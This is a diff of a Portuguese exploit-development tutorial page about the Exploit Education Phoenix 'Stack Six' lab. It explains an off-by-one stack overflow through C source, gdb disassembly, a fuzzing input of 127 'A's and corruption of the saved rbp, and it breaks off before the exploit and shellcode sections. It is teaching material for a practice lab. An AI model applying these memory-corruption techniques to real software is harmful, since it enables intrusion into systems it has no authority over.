@@ -1,145 +1,199 @@
 <!DOCTYPE HTML>
-<html lang="en">
+<html lang="pt-br" class="sidebar-visible no-js ayu">
     <head>
+        <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
         <title>Stack Six - Um Livrinho Sobre Exploit Dev</title>
+        <!-- Custom HTML head -->
+        
+
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
         <meta name="description" content="">
         <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
 
-        <base href="../../">
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
 
-        <link rel="stylesheet" href="book.css">
-        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
-        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">
-
-        <link rel="shortcut icon" href="favicon.png">
-
-        <!-- Font Awesome -->
-        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
-
-        <link rel="stylesheet" href="highlight.css">
-        <link rel="stylesheet" href="tomorrow-night.css">
-        <link rel="stylesheet" href="ayu-highlight.css">
-
-        <!-- Custom theme -->
-        
-
-        
-
-        <!-- Fetch Clipboard.js from CDN but have a local fallback -->
-        <script src="https://cdn.jsdelivr.net/clipboard.js/1.6.1/clipboard.min.js"></script>
-        <script>
-            if (typeof Clipboard == 'undefined') {
-                document.write(unescape("%3Cscript src='clipboard.min.js'%3E%3C/script%3E"));
-            }
-        </script>
-
-        <!-- Fetch JQuery from CDN but have a local fallback -->
-        <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
-        <script>
-            if (typeof jQuery == 'undefined') {
-                document.write(unescape("%3Cscript src='jquery.js'%3E%3C/script%3E"));
-            }
-        </script>
-
-        <!-- Fetch store.js from local - TODO add CDN when 2.x.x is available on cdnjs -->
-        <script src="store.js"></script>
-
+        <!-- Custom theme stylesheets -->
     </head>
-    <body class="light">
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "ayu";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
         <!-- Set the theme before any content is loaded, prevents flash -->
         <script type="text/javascript">
-            var theme = store.get('mdbook-theme');
-            if (theme === null || theme === undefined) { theme = 'light'; }
-            $('body').removeClass().addClass(theme);
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('ayu')
+            html.classList.add(theme);
+            html.classList.add('js');
         </script>
 
         <!-- Hide / unhide sidebar before it is displayed -->
         <script type="text/javascript">
-            var sidebar = store.get('mdbook-sidebar');
-            if (sidebar === "hidden") { $("html").addClass("sidebar-hidden") }
-            else if (sidebar === "visible") { $("html").addClass("sidebar-visible") }
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
         </script>
 
-        <div id="sidebar" class="sidebar">
-            <ul class="chapter"><li><a href="./mapa.html"><strong>1.</strong> Mapa</a></li><li class="spacer"></li><li><a href="./stack/stack.html"><strong>2.</strong> Stack</a></li><li><a href="./stack/phoenix/setup.html"><strong>3.</strong> Phoenix Stack</a></li><li><ul class="section"><li><a href="./stack/phoenix/StackZero.html"><strong>3.1.</strong> Stack Zero</a></li><li><a href="./stack/phoenix/StackOne.html"><strong>3.2.</strong> Stack One</a></li><li><a href="./stack/phoenix/StackTwo.html"><strong>3.3.</strong> Stack Two</a></li><li><a href="./stack/phoenix/StackThree.html"><strong>3.4.</strong> Stack Three</a></li><li><a href="./stack/phoenix/StackFour.html"><strong>3.5.</strong> Stack Four</a></li><li><a href="./stack/phoenix/StackFive.html"><strong>3.6.</strong> Stack Five</a></li><li><a href="./stack/phoenix/StackSix.html" class="active"><strong>3.7.</strong> Stack Six</a></li></ul></li><li><a href="./stack/mitigacoes.html"><strong>4.</strong> Mitigações</a></li><li><a href="./stack/ret2libc.html"><strong>5.</strong> Ret2LibC</a></li><li><ul class="section"><li><strong>5.1.</strong> Protostar Stack Six</li><li><strong>5.2.</strong> Avançado: Múltiplos ret2libc</li></ul></li><li><a href="./stack/gotplt.html"><strong>6.</strong> GOT e PLT</a></li><li><a href="./stack/rop/intro.html"><strong>7.</strong> ROP</a></li><li><ul class="section"><li><a href="./stack/rop/primitivos.html"><strong>7.1.</strong> Primitivos</a></li><li><ul class="section"><li><a href="./stack/rop/ROPE/dump.html"><strong>7.1.1.</strong> ROPE</a></li></ul></li><li><strong>7.2.</strong> Pivot</li><li><ul class="section"><li><a href="./stack/rop/ROPE/pivot.html"><strong>7.2.1.</strong> ROPE: pivot</a></li></ul></li><li><a href="./stack/rop/SROP/SROP.html"><strong>7.3.</strong> SROP</a></li><li><a href="./stack/rop/ret2dlresolve.html"><strong>7.4.</strong> ret2dl-resolve</a></li></ul></li><li><a href="./stack/ASLR/aslr.html"><strong>8.</strong> ASLR</a></li><li><ul class="section"><li><a href="./stack/ASLR/corromperGOT.html"><strong>8.1.</strong> Corromper GOT</a></li><li><a href="./stack/ASLR/ret2plt.html"><strong>8.2.</strong> ret2plt</a></li></ul></li><li><strong>9.</strong> Canary</li><li><strong>10.</strong> PIE</li><li><a href="./stack/leakAll.html"><strong>11.</strong> Extra: Leakando tudo</a></li><li class="spacer"></li><li><a href="./heap/heap.html"><strong>12.</strong> Heap</a></li><li><a href="./heap/intro.html"><strong>13.</strong> Intro</a></li><li><strong>14.</strong> Bugs Gerais</li><li><ul class="section"><li><strong>14.1.</strong> UAF</li><li><ul class="section"><li><a href="./heap/geral/uaf/heap-two.html"><strong>14.1.1.</strong> Exploit Education: Heap Two</a></li></ul></li></ul></li><li><a href="./heap/relacionados/relacionados.html"><strong>15.</strong> Conceitos Relacionados</a></li><li><ul class="section"><li><a href="./heap/relacionados/io_list_all.html"><strong>15.1.</strong> _IO_list_all</a></li></ul></li><li><a href="./heap/malloc/intro.html"><strong>16.</strong> Atacando Malloc</a></li><li><ul class="section"><li><a href="./heap/malloc/teoria.html"><strong>16.1.</strong> Teoria</a></li><li><a href="./heap/malloc/fastbinsDup.html"><strong>16.2.</strong> Fastbins Dup</a></li><li><a href="./heap/malloc/HouseOfForce.html"><strong>16.3.</strong> House of Force</a></li><li><a href="./heap/malloc/HouseOfSpirit.html"><strong>16.4.</strong> House of Spirit</a></li><li><a href="./heap/malloc/unsafeUnlink.html"><strong>16.5.</strong> Unsafe Unlink</a></li><li><a href="./heap/malloc/safeUnlink.html"><strong>16.6.</strong> Safe Unlink</a></li><li><a href="./heap/malloc/PartialUnlink.html"><strong>16.7.</strong> Unsorted bins: Partial Unlink</a></li><li><a href="./heap/malloc/HouseOfOrange.html"><strong>16.8.</strong> House of Orange</a></li><li><a href="./heap/malloc/HouseOfLore.html"><strong>16.9.</strong> House of Lore</a></li><li><strong>16.10.</strong> House of Rust</li><li><strong>16.11.</strong> House of Corrosion</li><li><strong>16.12.</strong> House of Einherjar</li></ul></li><li><strong>17.</strong> Extra</li><li class="spacer"></li><li><a href="./linux_internals/linux.html"><strong>18.</strong> Linux Internals</a></li><li><a href="./linux_internals/prerequisitos.html"><strong>19.</strong> Prerequisitos</a></li></ul>
-        </div>
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item affix "><a href="../../mapa.html">Mapa</a></li><li class="spacer"></li><li class="chapter-item "><a href="../../stack/stack.html">Stack</a></li><li class="chapter-item expanded "><a href="../../stack/phoenix/setup.html">Phoenix Stack</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../stack/phoenix/StackZero.html">Stack Zero</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackOne.html">Stack One</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackTwo.html">Stack Two</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackThree.html">Stack Three</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackFour.html">Stack Four</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackFive.html">Stack Five</a></li><li class="chapter-item expanded "><a href="../../stack/phoenix/StackSix.html" class="active">Stack Six</a></li></ol></li><li class="chapter-item "><a href="../../stack/mitigacoes.html">Mitigações</a></li><li class="chapter-item "><a href="../../stack/ret2libc.html">Ret2LibC</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Protostar Stack Six</div></li><li class="chapter-item "><div>Avançado: Múltiplos ret2libc</div></li></ol></li><li class="chapter-item "><a href="../../stack/gotplt.html">GOT e PLT</a></li><li class="chapter-item "><a href="../../stack/rop/intro.html">ROP</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../stack/rop/primitivos.html">Primitivos</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../stack/rop/ROPE/dump.html">ROPE</a></li></ol></li><li class="chapter-item "><div>Pivot</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../stack/rop/ROPE/pivot.html">ROPE: pivot</a></li></ol></li><li class="chapter-item "><a href="../../stack/rop/SROP/SROP.html">SROP</a></li><li class="chapter-item "><a href="../../stack/rop/ret2dlresolve.html">ret2dl-resolve</a></li></ol></li><li class="chapter-item "><a href="../../stack/ASLR/aslr.html">ASLR</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../stack/ASLR/corromperGOT.html">Corromper GOT</a></li><li class="chapter-item "><a href="../../stack/ASLR/ret2plt.html">ret2plt</a></li><li class="chapter-item "><a href="../../stack/ASLR/brute32.html">Bruteforce</a></li></ol></li><li class="chapter-item "><div>Canary</div></li><li class="chapter-item "><div>PIE</div></li><li class="chapter-item "><a href="../../stack/leakAll.html">Extra: Leakando tudo</a></li><li class="spacer"></li><li class="chapter-item "><a href="../../heap/heap.html">Heap</a></li><li class="chapter-item "><a href="../../heap/intro.html">Intro</a></li><li class="chapter-item "><div>Bugs Gerais</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>UAF</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../heap/geral/uaf/heap-two.html">Exploit Education: Heap Two</a></li></ol></li></ol></li><li class="chapter-item "><a href="../../heap/relacionados/relacionados.html">Conceitos Relacionados</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../heap/relacionados/io_list_all.html">_IO_list_all</a></li></ol></li><li class="chapter-item "><a href="../../heap/malloc/intro.html">Atacando Malloc</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../heap/malloc/teoria.html">Teoria</a></li><li class="chapter-item "><a href="../../heap/malloc/fastbinsDup.html">Fastbins Dup</a></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfForce.html">House of Force</a></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfSpirit.html">House of Spirit</a></li><li class="chapter-item "><a href="../../heap/malloc/unsafeUnlink.html">Unsafe Unlink</a></li><li class="chapter-item "><a href="../../heap/malloc/safeUnlink.html">Safe Unlink</a></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfEinherjar.html">House of Einherjar</a></li><li class="chapter-item "><a href="../../heap/malloc/PartialUnlink.html">Unsorted bins: Partial Unlink</a></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfOrange.html">House of Orange</a></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfLore.html">House of Lore</a></li><li class="chapter-item "><div>House of Rust</div></li><li class="chapter-item "><div>House of Corrosion</div></li></ol></li><li class="chapter-item "><div>Extra</div></li><li class="spacer"></li><li class="chapter-item "><a href="../../linux_internals/linux.html">Linux Internals</a></li><li class="chapter-item "><a href="../../linux_internals/prerequisitos.html">Prerequisitos</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
 
         <div id="page-wrapper" class="page-wrapper">
 
-            <div class="page" tabindex="-1">
+            <div class="page">
                 
-                <div id="menu-bar" class="menu-bar">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
                     <div class="left-buttons">
-                        <i id="sidebar-toggle" class="fa fa-bars" title="Toggle sidebar"></i>
-                        <i id="theme-toggle" class="fa fa-paint-brush" title="Change theme"></i>
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
                     </div>
 
                     <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>
 
                     <div class="right-buttons">
-                        <a href="print.html">
-                            <i id="print-button" class="fa fa-print" title="Print this book"></i>
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                        <a href="https://github.com/0xturazzi/Um-Livrinho-Sobre-Exploit-Dev/" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
                         </a>
                     </div>
                 </div>
 
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
                 <div id="content" class="content">
-                    <ul>
-<li><a href="./stack/phoenix/StackSix.html#-dicas">💡 Dicas</a></li>
-<li><a href="./stack/phoenix/StackSix.html#-explica%C3%A7%C3%A3o">🛸 Explicação</a>
+                    <main>
+                        <ul>
+<li><a href="#-dicas">💡 Dicas</a></li>
+<li><a href="#-explica%C3%A7%C3%A3o">🛸 Explicação</a>
 <ul>
-<li><a href="./stack/phoenix/StackSix.html#analisando-o-programa">Analisando o programa</a>
+<li><a href="#analisando-o-programa">Analisando o programa</a>
 <ul>
-<li><a href="./stack/phoenix/StackSix.html#main">main</a>
+<li><a href="#main">main</a>
 <ul>
-<li><a href="./stack/phoenix/StackSix.html#dica">Dica</a></li>
+<li><a href="#dica">Dica</a></li>
 </ul>
 </li>
-<li><a href="./stack/phoenix/StackSix.html#greet">greet</a></li>
+<li><a href="#greet">greet</a></li>
 </ul>
 </li>
-<li><a href="./stack/phoenix/StackSix.html#analisando-o-programa-asm">Analisando o programa (ASM)</a>
+<li><a href="#analisando-o-programa-asm">Analisando o programa (ASM)</a>
 <ul>
-<li><a href="./stack/phoenix/StackSix.html#main-1">main</a></li>
+<li><a href="#main-1">main</a></li>
 </ul>
 </li>
-<li><a href="./stack/phoenix/StackSix.html#fuzz">Fuzz</a></li>
-<li><a href="./stack/phoenix/StackSix.html#e-vamos-rodar-com-127-as">E vamos rodar com 127 As:</a>
+<li><a href="#fuzz">Fuzz</a></li>
+<li><a href="#e-vamos-rodar-com-127-as">E vamos rodar com 127 As:</a>
 <ul>
-<li><a href="./stack/phoenix/StackSix.html#curiosidade">Curiosidade</a></li>
+<li><a href="#curiosidade">Curiosidade</a></li>
 </ul>
 </li>
-<li><a href="./stack/phoenix/StackSix.html#como-ir-de-off-by-one-para-execu%C3%A7%C3%A3o-de-c%C3%B3digo">Como ir de off-by-one para execução de código</a>
+<li><a href="#como-ir-de-off-by-one-para-execu%C3%A7%C3%A3o-de-c%C3%B3digo">Como ir de off-by-one para execução de código</a>
 <ul>
-<li><a href="./stack/phoenix/StackSix.html#ret-com-um-rbp-corrompido">Ret com um RBP corrompido</a></li>
+<li><a href="#ret-com-um-rbp-corrompido">Ret com um RBP corrompido</a></li>
 </ul>
 </li>
 </ul>
 </li>
-<li><a href="./stack/phoenix/StackSix.html#-exploit">🔥 Exploit</a>
+<li><a href="#-exploit">🔥 Exploit</a>
 <ul>
-<li><a href="./stack/phoenix/StackSix.html#o-que-controlamos">O que controlamos?</a>
+<li><a href="#o-que-controlamos">O que controlamos?</a>
 <ul>
-<li><a href="./stack/phoenix/StackSix.html#setup">Setup</a></li>
-<li><a href="./stack/phoenix/StackSix.html#descobrir-que-partes-da-memoria-controlamos">Descobrir que partes da memoria controlamos</a></li>
-<li><a href="./stack/phoenix/StackSix.html#encontrar-para-que-regi%C3%A3o-podemos-apontar-rbp">Encontrar para que região podemos apontar rbp</a></li>
-<li><a href="./stack/phoenix/StackSix.html#encontrar-um-pointer-nessa-regi%C3%A3o-que-aponte-para-a-parte-que-controlamos">Encontrar um pointer nessa região que aponte para a parte que controlamos</a></li>
+<li><a href="#setup">Setup</a></li>
+<li><a href="#descobrir-que-partes-da-memoria-controlamos">Descobrir que partes da memoria controlamos</a></li>
+<li><a href="#encontrar-para-que-regi%C3%A3o-podemos-apontar-rbp">Encontrar para que região podemos apontar rbp</a></li>
+<li><a href="#encontrar-um-pointer-nessa-regi%C3%A3o-que-aponte-para-a-parte-que-controlamos">Encontrar um pointer nessa região que aponte para a parte que controlamos</a></li>
 </ul>
 </li>
-<li><a href="./stack/phoenix/StackSix.html#shellcode">Shellcode</a></li>
+<li><a href="#shellcode">Shellcode</a></li>
 </ul>
 </li>
-<li><a href="./stack/phoenix/StackSix.html#-solu%C3%A7%C3%A3o">💫 Solução</a></li>
+<li><a href="#-solu%C3%A7%C3%A3o">💫 Solução</a></li>
 </ul>
-<a class="header" href="./stack/phoenix/StackSix.html#-dicas" id="-dicas"><h1>💡 Dicas</h1></a>
+<h1 id="-dicas"><a class="header" href="#-dicas">💡 Dicas</a></h1>
 <p>Off-by-one BOF</p>
-<a class="header" href="./stack/phoenix/StackSix.html#-explicação" id="-explicação"><h1>🛸 Explicação</h1></a>
-<p>O programa aceita um nome por meio da env <code>ExploitEducation</code>! Esse nome é usado para gerar uma mensagem de boas vindas! \
+<h1 id="-explicação"><a class="header" href="#-explicação">🛸 Explicação</a></h1>
+<p>O programa aceita um nome por meio da env <code>ExploitEducation</code>! Esse nome é usado para gerar uma mensagem de boas vindas! \ 
 Esse processo de gerar as mensagens é vulnerável a buffer overflow!</p>
-<a class="header" href="./stack/phoenix/StackSix.html#analisando-o-programa" id="analisando-o-programa"><h2>Analisando o programa</h2></a>
-<a class="header" href="./stack/phoenix/StackSix.html#main" id="main"><h3>main</h3></a>
+<h2 id="analisando-o-programa"><a class="header" href="#analisando-o-programa">Analisando o programa</a></h2>
+<h3 id="main"><a class="header" href="#main">main</a></h3>
 <pre><code class="language-C">int main(int argc, char **argv) {
   char *ptr;
   printf(&quot;%s\n&quot;, BANNER);
@@ -186,13 +240,13 @@ Esse processo de gerar as mensagens é vulnerável a buffer overflow!</p>
 </blockquote>
 <p>por ultimo, <code>greet()</code> é chamada, e o valor retornado por ela é printado!</p>
 <p>E o programa finaliza retornando <code>0</code> (sem erro)!</p>
-<a class="header" href="./stack/phoenix/StackSix.html#dica" id="dica"><h4>Dica</h4></a>
+<h4 id="dica"><a class="header" href="#dica">Dica</a></h4>
 <p>Para definir uma env var no gdb</p>
 <p><img src="./img/stack_six/Exit_Codes_gdb.png" alt="set environment ExploitEducation=ABC" /></p>
 <blockquote>
 <p>set environment ExploitEducation=ABC</p>
 </blockquote>
-<a class="header" href="./stack/phoenix/StackSix.html#greet" id="greet"><h3>greet</h3></a>
+<h3 id="greet"><a class="header" href="#greet">greet</a></h3>
 <pre><code class="language-C">char *greet(char *who) { // who = nome da pessoa
   char buffer[128];
   int maxSize;
@@ -226,7 +280,7 @@ Esse processo de gerar as mensagens é vulnerável a buffer overflow!</p>
 <pre><code class="language-C">strcpy(buffer, what); // what = inicio da mensagem
 strncpy(buffer, who, maxSize); // who = o valor de ExploitEducation! Quem recebe o oi :D
 </code></pre>
-<p>Nos ja sabemos como o <code>strcpy</code> funciona (você passa um buffer como alvo e o que vamos salvar nele, ignorando tamanho!
+<p>Nos ja sabemos como o <code>strcpy</code> funciona (você passa um buffer como alvo e o que vamos salvar nele, ignorando tamanho! 
 Caso nos conseguíssemos controlar what, poderíamos facilmente exploitar o programa)</p>
 <p>str <strong>N</strong> cpy (<code>strncpy</code>) é similar a <code>strcpy</code>, mas recebe um terceiro parâmetro: tamanho!</p>
 <p>Esse tamanho é limitado à 127 (limite de <code>maxSize</code>), então teoricamente não seria exploitavel :(</p>
@@ -240,8 +294,8 @@ Caso nos conseguíssemos controlar what, poderíamos facilmente exploitar o prog
 <p>Isso quer dizer que no buffer cabem 128, mas foram colocados <strong>34 + 127</strong>: Overflow!</p>
 <p>Então se não fosse pelo inicio da mensagem, não seria exploitavel :D</p>
 <p>Uma maneira de concertar essa vulnerabilidade seria: <code>strncpy(buffer, who, maxSize - sizeof(buffer))</code> (subtrair o tamanho atual)</p>
-<a class="header" href="./stack/phoenix/StackSix.html#analisando-o-programa-asm" id="analisando-o-programa-asm"><h2>Analisando o programa (ASM)</h2></a>
-<a class="header" href="./stack/phoenix/StackSix.html#main-1" id="main-1"><h3>main</h3></a>
+<h2 id="analisando-o-programa-asm"><a class="header" href="#analisando-o-programa-asm">Analisando o programa (ASM)</a></h2>
+<h3 id="main-1"><a class="header" href="#main-1">main</a></h3>
 <pre><code class="language-x86asm">gef&gt; disassemble main
 push   rbp
 mov    rbp,rsp                    ; Prologo
@@ -293,7 +347,7 @@ ret
 </code></pre>
 <p>Não é tão relevante analisar o assembly de greet para entender a vulnerabilidade, dado que temos o código fonte!</p>
 <p>Mas caso queira, você pode analisar por conta própria e relacionar o ASM com o código fonte por treino :D</p>
-<a class="header" href="./stack/phoenix/StackSix.html#fuzz" id="fuzz"><h2>Fuzz</h2></a>
+<h2 id="fuzz"><a class="header" href="#fuzz">Fuzz</a></h2>
 <p>Agora que sabemos que é possível realizar o overflow, vamos ver o que é corrompido :D</p>
 <p>Nos só podemos colocar 127 no bytes no input, pois se colocarmos mais o programa simplesmente vai remove-los: então <strong>colocar 127 ou 200 teria o mesmo efeito!</strong> :)</p>
 <p>Primeiro, vamos encontrar aonde colocaremos nossos breakpoints</p>
@@ -317,8 +371,8 @@ Breakpoint 1 at 0x4006fe
 gef&gt; b *0x40079a
 Breakpoint 2 at 0x40079a
 </code></pre>
-<a class="header" href="./stack/phoenix/StackSix.html#e-vamos-rodar-com-127-as" id="e-vamos-rodar-com-127-as"><h2>E vamos rodar com 127 As:</h2></a>
-<p>Obs:</p>
+<h2 id="e-vamos-rodar-com-127-as"><a class="header" href="#e-vamos-rodar-com-127-as">E vamos rodar com 127 As:</a></h2>
+<p>Obs: </p>
 <blockquote>
 <p>gef&gt; set environment ExploitEducation=$(python -c &quot;print 'A' * 127&quot;)</p>
 </blockquote>
@@ -331,7 +385,7 @@ Breakpoint 2 at 0x40079a
 <blockquote>
 <p>gef&gt; set environment ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p>
 </blockquote>
-<p>eita, overflow no tutorial XD ! O computador ta se revoltando!!</p>
+<p>eita, overflow no tutorial XD ! O computador ta se revoltando!! </p>
 <p>Agora, vamos rodar o programa <code>r</code>. Quando ele chegar no <code>breakpoint 1</code> (inicio de greet), pode <code>analisar o frame</code> e ver <code>aonde o rbp de main foi salvo</code>!</p>
 <pre><code class="language-x86asm">gef&gt; info frame
 Stack level 0, frame at 0x7fffffffe590:
@@ -366,23 +420,23 @@ gef&gt; x/xg 0x7fffffffe588             -&gt; rip
 <blockquote>
 <p>0x00007fffffffe5<strong>b0</strong> ---&gt;  0x00007fffffffe5<strong>41</strong></p>
 </blockquote>
-<p>Isso quer dizer que nós conseguimos controlar o últimos byte do rbp salvo! Esse ultimo byte constuma ser
+<p>Isso quer dizer que nós conseguimos controlar o últimos byte do rbp salvo! Esse ultimo byte constuma ser 
 chamado de <code>LSB</code> (Least Significant Byte, Byte menos significante)</p>
 <p>Assim, quer dizer que esse buffer overflow é um <code>BoF</code> que corrompe o <code>LSB</code>, ou como é mais conhecido: <strong>off-by-one</strong> (errado por um)!</p>
 <p>Esse tipo de buffer overflow é bem comum: vão esquecer de que o buffer termina com um <code>0x00</code> e vão comparar o <code>input</code> com o <code>tamanho do buffer</code>,
 ao eves do <code>tamanho do buffer - 1</code>. Assim, permitindo que seja escrito 1 byte fora do buffer!</p>
-<a class="header" href="./stack/phoenix/StackSix.html#curiosidade" id="curiosidade"><h4>Curiosidade</h4></a>
+<h4 id="curiosidade"><a class="header" href="#curiosidade">Curiosidade</a></h4>
 <p>Lembra que o texto no inicio do buffer varia de arquitetura para arquitetura? Isso acontece pois cada uma aloca as variáveis em uma posição,
 otimizam de maneira diferente, etcetc!</p>
-<p>Muitas vezes um <strong>off-by-one</strong> não vai ser exploitavel, pois o byte que vem logo depois do buffer não necessariamente é o rbp!
+<p>Muitas vezes um <strong>off-by-one</strong> não vai ser exploitavel, pois o byte que vem logo depois do buffer não necessariamente é o rbp! 
 E esse é o nosso caso: existem outras variáveis dentro de greet!</p>
 <p>Assim, quem desenvolveu o desafio nos fez o favor de colocar essa mensagem no inicio para compensar esse espaço!</p>
-<p>Caso a mensagem fosse 1 byte maior, poderíamos controlar 2 bytes do rbp! Caso a mensagem fosse 1 byte MENOR, não conseguiríamos controlar o rbp!</p>
+<p>Caso a mensagem fosse 1 byte maior, poderíamos controlar 2 bytes do rbp! Caso a mensagem fosse 1 byte MENOR, não conseguiríamos controlar o rbp! </p>
 <p>E caso a mensagem fosse 4 bytes a mais, como você pode imaginar, poderíamos controlar o RIP :D</p>
 <p>...</p>
 <p>E caso o programa nem cheque o input? Ai facilita bastante pra gente hehe :D ! É o caso do desafio passado!</p>
 <p>Assim, esse desafio foi feito de uma maneira que vá nos ensinar como exploitar um <strong>off-by-one</strong> que nos da <strong>execução de código</strong></p>
-<p>Na vida real, caso não existisse essa mensagem, só conseguiríamos exploitar esse off-by-one caso o nosso buffer estivesse adjacente ao rbp,
+<p>Na vida real, caso não existisse essa mensagem, só conseguiríamos exploitar esse off-by-one caso o nosso buffer estivesse adjacente ao rbp, 
 isto é: não existe nenhuma outra variável, ou o buffer foi alocado na parte mais baixa da stack(Do lado do RBP)!</p>
 <pre><code>Nesse caso, nós nao conseguiríamos alterar RBP nem RIP,
 portanto seria impossível conseguir execução de código :(
@@ -396,31 +450,31 @@ O impacto disso varia muito: não acontecer nada (mais comum),
 fazer o programa crashar, ou alterar um valor importante 
 (por exemplo, aquela variável poderia armazenar o seu saldo do banco hehe ;) )...
 </code></pre>
-<a class="header" href="./stack/phoenix/StackSix.html#como-ir-de-off-by-one-para-execução-de-código" id="como-ir-de-off-by-one-para-execução-de-código"><h2>Como ir de off-by-one para execução de código</h2></a>
